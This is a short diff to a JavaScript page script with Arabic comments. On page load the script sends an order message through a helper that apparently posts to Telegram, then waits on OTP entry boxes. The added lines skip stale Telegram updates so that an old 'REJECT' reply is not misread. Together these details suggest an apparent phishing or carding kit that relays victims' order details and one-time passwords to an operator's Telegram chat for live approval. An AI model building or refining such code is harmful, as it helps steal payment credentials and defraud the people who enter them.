@@ -343,6 +343,12 @@ document.addEventListener('DOMContentLoaded', async () => {
   /* 📨 رسالة الطلب الأولى (بدون OTP) */
   await tgSend(buildOrderMsg());
 
+  /* تجاوز أي رسائل قديمة في الشات عشان ما تجيب REJECT مزيف */
+  const oldUpdates = await tgGetUpdates();
+  if (oldUpdates.length > 0) {
+    lastUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
+  }
+
   /* تفعيل أول مربع */
   document.querySelector('.otp-box')?.focus();
 });
